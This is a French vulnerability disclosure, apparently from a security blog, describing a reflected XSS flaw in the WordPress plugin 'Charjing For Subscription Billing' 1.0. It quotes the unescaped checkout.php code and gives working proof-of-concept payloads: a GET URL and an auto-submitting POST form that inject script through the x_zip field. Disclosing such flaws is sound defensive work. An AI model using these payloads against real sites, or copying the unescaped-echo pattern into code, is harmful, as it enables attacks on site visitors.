---
title: "Cross-Site Scripting (reflected) dans le plugin Wordpress Charjing For Subscription Billing"
tags: [vulnérabilité]
---

## Présentation du plugin

Le plugin Wordpress [Charjing For Subscription Billing](https://wordpress.org/plugins/charjing/) (slug: `charjing`) se présente de cette façon :

> Charjing provides a very simple products billing and subscription management using custom post type
 
La version testée est la 1.0 qui date d'il y a plus de huit ans.

## La vulnérabilité

Le script `checkout.php` affiche tel quel des variables reçues dans la requête :

```php
        <div>                                                                                                          
          <label>CCV</label>                                                                                           
          <input type="text" class="text required" size="4" name="x_card_code" value="<?php echo(@$_REQUEST["x_card_code"]); ?>"></input>
        </div>                                                                                                         
      </fieldset>                                                                                                      
      <fieldset>                                                                                                       
        <div>                                                                                                          
          <label>First Name</label>                                                                                    
          <input type="text" class="text required" size="15" name="x_first_name" value="<?php echo(@$_REQUEST["x_first_name"]); ?>"></input>
        </div>                                                                                                         
        <div>                                                                                                          
          <label>Last Name</label>                                                                                     
          <input type="text" class="text required" size="14" name="x_last_name" value="<?php echo(@$_REQUEST["x_last_name"]); ?>"></input>
        </div>                                                                                                         
      </fieldset>                                                                                                      
      <fieldset>                                                                                                       
        <div>                                                                                                          
          <label>Address</label>                                                                                       
          <input type="text" class="text required" size="26" name="x_address" value="<?php echo(@$_REQUEST["x_address"]); ?>"></input>
        </div>                                                                                                         
        <div>                                                                                                          
          <label>City</label>                                                                                          
          <input type="text" class="text required" size="15" name="x_city" value="<?php echo(@$_REQUEST["x_city"]); ?>"></input>
        </div>                                                                                                         
      </fieldset>                                                                                                      
      <fieldset>                                                                                                       
        <div>                                                                                                          
          <label>State</label>                                                                                         
          <input type="text" class="text required" size="4" name="x_state" value="<?php echo(@$_REQUEST["x_state"]); ?>"></input>
        </div>                                                                                                         
        <div>                                                                                                          
          <label>Zip Code</label>                                                                                      
          <input type="text" class="text required" size="9" name="x_zip" value="<?php echo(@$_REQUEST["x_zip"]); ?>"></input>
        </div>
```

Cela rend le plugin vulnérable à une faille XSS par l'un des paramètres utilisés.

Le script ne peut pas être accédé directement, il faut trouver une page sur laquelle se trouve le formulaire généré par le plugin.

PoC:

```
http://localhost:8000/?page_id=2&x_zip=%22%3E%3Cscript%3Ealert(/XSS/)%3C/script%3E
```

Ou en utilisant POST :

```html
<html>
<body>
<form id="myForm" method="POST" action="http://localhost:8000/?page_id=2">
        <input type="hidden" name="nproduct_id" value="default" />
        <input type="hidden" name="charjing_pay" value="authorize" />
        <input type="hidden" name="x_email" value="nobody@nowhere.com" />
        <input type="hidden" name="x_card_num" value="default" />
        <input type="hidden" name="x_card_code" value="default" />
        <input type="hidden" name="x_first_name" value="default" />
        <input type="hidden" name="x_last_name" value="default" />
        <input type="hidden" name="x_address" value="default" />
        <input type="hidden" name="x_city" value="default" />
        <input type="hidden" name="x_state" value="default" />
        <input type="hidden" name="x_zip" value="&quot;&gt;&lt;ScRiPt&gt;alert(/XSS/)&lt;/sCrIpT&gt;" />
        <input type="hidden" name="cmdConfirmOrder" value="Confirm Order" />
        <input type="hidden" name="x_exp_month" value="12" />
        <input type="hidden" name="x_exp_date" value="33" />
        <input type="hidden" name="x_country" value="United States" />
</form>
<script>document.createElement('form').submit.call(document.getElementById('myForm'));</script>
</body>
</html>
```
